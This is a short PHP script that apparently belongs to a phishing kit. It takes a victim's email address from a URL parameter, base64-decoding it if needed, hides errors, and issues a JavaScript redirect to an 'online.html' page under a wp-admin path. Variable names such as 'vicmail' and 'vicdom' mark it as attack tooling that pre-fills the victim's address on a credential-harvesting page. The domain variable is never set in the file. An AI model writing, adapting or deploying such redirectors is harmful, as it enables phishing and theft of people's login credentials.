<?php

@session_start();
error_reporting(0);
if (!empty($_GET['code'])){$wildcard = 1;} else {$wildcard = 0;}
if(!preg_match("/@/",$_GET['code'])){$vicmail = base64_decode($_GET['code']);} else {$vicmail = $_GET['code'];}
if ($wildcard == "1"){
	echo "<script type= \"text/javascript\">window.location.href = \"https://$vicdom/wp-admin/online.html#$vicmail\"</script>\n";
	} else {
	echo "<script type= \"text/javascript\">window.location.href = \"https://$vicdom/wp-admin/online.html#/\"</script>\n";
	}
?>
